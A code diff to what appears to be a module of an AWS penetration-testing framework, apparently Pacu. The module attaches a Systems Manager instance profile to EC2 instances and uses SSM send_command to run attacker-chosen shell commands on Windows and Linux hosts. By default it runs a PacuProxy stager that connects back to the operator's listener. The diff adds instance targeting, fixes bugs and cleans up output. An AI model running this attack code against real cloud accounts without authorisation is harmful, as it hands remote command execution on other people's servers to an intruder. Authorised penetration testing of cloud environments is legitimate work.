@@ -37,6 +37,7 @@ parser = argparse.ArgumentParser(add_help=False, description=module_info['descri
 parser.add_argument('--command', required=False, default=None, help='The shell command to run on the targeted EC2 instances. If no command is specified AND PacuProxy is listening, the default will be to run a PacuProxy stager against each target')
 parser.add_argument('--target-os', required=False, default='All', help='This argument is what operating systems to target. Valid options are: Windows, Linux, or All. The default is All')
 parser.add_argument('--all-instances', required=False, default=False, action='store_true', help='Skip vulnerable operating system check and just target every instance')
+parser.add_argument('--target-instances', required=False, default=None, help='A comma-separated list of instances and regions to set as the attack targets in the format of instance-id@region,instance2-id@region...')
 parser.add_argument('--replace', required=False, default=False, action='store_true', help='For EC2 instances that already have an instance profile attached to them, this argument will replace those with the Systems Manager instance profile. WARNING: This can cause bad things to happen! You never know what negative side effects this may have on a server without further inspection, because you do not know what permissions you are removing/replacing that the instance already had')
 parser.add_argument('--ip-name', required=False, default=None, help='The name of an existing instance profile with an "EC2 Role for Simple Systems Manager" attached to it. This will skip the automatic role/instance profile enumeration and the searching for a Systems Manager role/instance profile')
 
@@ -71,6 +72,9 @@ def main(args, pacu_main):
     if args.command is None and proxy_settings.listening is True:
         pp_windows_stager = pacu_main.get_proxy_stager(proxy_settings.ip, proxy_settings.port, 'win')
         pp_linux_stager = pacu_main.get_proxy_stager(proxy_settings.ip, proxy_settings.port, 'lin')
+    elif args.command is None and proxy_settings.listening is False:
+        print('Invalid arguments received. No command argument was passed in and PacuProxy is not listening, so there is no default. Either start PacuProxy and run again or run again with the --command argument.\n')
+        return
 
     if fetch_data(['EC2', 'Instances'], 'enum_ec2', '--instances') is False:
         print('Pre-req module not run successfully. Exiting...')
@@ -80,6 +84,7 @@ def main(args, pacu_main):
     regions = get_regions('EC2')
 
     targeted_instances = []
+    ssm_role_name = ''
     if args.ip_name is not None:
         ssm_instance_profile_name = args.ip_name
     else:
@@ -196,15 +201,11 @@ def main(args, pacu_main):
                         # For each key in the dict, check if it equal ec2.amazonaws.com
                         for key in statement['Principal']:
                             if statement['Principal'][key] == 'ec2.amazonaws.com':
-                                print(role['RoleName'])
                                 attached_policies = client.list_attached_role_policies(
                                     RoleName=role['RoleName']
                                 )['AttachedPolicies']
-                                print(attached_policies)
                                 # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
                                 for policy in attached_policies:
-                                    print(policy['PolicyArn'])
-                                    print(policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM')
                                     if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
                                         ssm_role_name = role['RoleName']
                                         break
@@ -418,12 +419,12 @@ def main(args, pacu_main):
                     if args.target_os.lower() == 'all' or instance[1].lower() == args.target_os.lower():
                         # Is this instance eligible for an attack, but was not targeted?
                         if instance[0] not in targeted_instances:
-                            action = input('  Instance ID {} (Platform: {}) was not found in the list of targeted instances, but it might be possible to attack it, do you want to attack this instance (a) or ignore it (i)? (a/i) '.format(instance[0], instance[1]))
+                            action = input('  Instance ID {} (Platform: {}) was not found in the list of targeted instances, but it might be possible to attack it, do you want to try and attack this instance (a) or ignore it (i)? (a/i) '.format(instance[0], instance[1]))
                             if action == 'i':
                                 ignored_instances.append(instance[0])
                                 continue
                             else:
-                                print('  Adding instance ID {} to list of targets.'.format(instance[0]))
+                                print('  Adding instance ID {} to list of targets.\n'.format(instance[0]))
                                 targeted_instances.append(instance[0])
                         if instance[1].lower() == 'windows':
                             windows_instances_to_attack.append(instance[0])
@@ -435,32 +436,32 @@ def main(args, pacu_main):
             # Collectively attack all new instances that showed up in the last check for this region
            
             # Windows
-            if args.target_os.lower() == 'all' or instance[1].lower() == 'windows':
+            if len(windows_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or instance[1].lower() == 'windows'):
                 response = client.send_command(
                     InstanceIds=windows_instances_to_attack,
                     DocumentName='AWS-RunPowerShellScript',
                     MaxErrors='100%',
                     Parameters={
-                        'commands': [shell_command if args.command is not None else pp_windows_stager]
+                        'commands': [args.command if args.command is not None else pp_windows_stager]
                     }
                 )
                 this_check_attacked_instances.extend(windows_instances_to_attack)
                 attacked_instances.extend(windows_instances_to_attack)
             
             # Linux
-            if args.target_os.lower() == 'all' or instance[1].lower() == 'linux':
+            if len(linux_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or instance[1].lower() == 'linux'):
                 response = client.send_command(
                     InstanceIds=linux_instances_to_attack,
                     DocumentName='AWS-RunShellScript',
                     MaxErrors='100%',
                     Parameters={
-                        'commands': [shell_command if args.command is not None else pp_linux_stager]
+                        'commands': [args.command if args.command is not None else pp_linux_stager]
                     }
                 )
                 this_check_attacked_instances.extend(linux_instances_to_attack)
                 attacked_instances.extend(linux_instances_to_attack)
             
-        print('{} new instances attacked in the latest check: {}\n'.format(len(this_check_attacked_instances), this_check_attacked_instances))
+        print('  {} new instances attacked in the latest check: {}\n'.format(len(this_check_attacked_instances), this_check_attacked_instances))
 
         if attacked_instances.sort() == targeted_instances.sort():
             # All targeted instances have been attacked, stop polling every 30 seconds
@@ -473,12 +474,12 @@ def main(args, pacu_main):
 
     if i == 19:
         # We are here because it has been 10 minutes
-        print('  It has been 10 minutes, if any target instances were not successfully attacked, then that most likely means they are not vulnerable to this attack (most likely the SSM Agent is not installed on the instances).\n')
-        print('  Successfully attacked the following instances: {}\n'.format(attacked_instances))
+        print('It has been 10 minutes, if any target instances were not successfully attacked, then that most likely means they are not vulnerable to this attack (most likely the SSM Agent is not installed on the instances).\n')
+        print('Successfully attacked the following instances: {}\n'.format(attacked_instances))
     else:
         # We are here because all targeted instances have been attacked
-        print('  All targeted instances showed up and were attacked.\n')
-        print('  Successfully attacked the following instances: {}\n'.format(attacked_instances))
+        print('All targeted instances showed up and were attacked.\n')
+        print('Successfully attacked the following instances: {}\n'.format(attacked_instances))
 
     print('{} completed.'.format(os.path.basename(__file__)))
     return
